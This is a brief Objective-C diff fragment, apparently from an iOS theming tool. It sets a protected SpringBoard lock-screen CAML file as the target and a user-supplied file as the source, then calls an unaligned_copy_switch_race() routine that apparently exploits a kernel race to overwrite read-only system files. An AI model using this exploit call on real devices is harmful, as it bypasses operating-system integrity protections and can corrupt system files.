+                NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+                NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+                const char *model_path = dirName.UTF8String;
+                g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
+                g_arg_overwrite_file_path = model_path;
+                unaligned_copy_switch_race();
+            }
+        });
+    }
 }
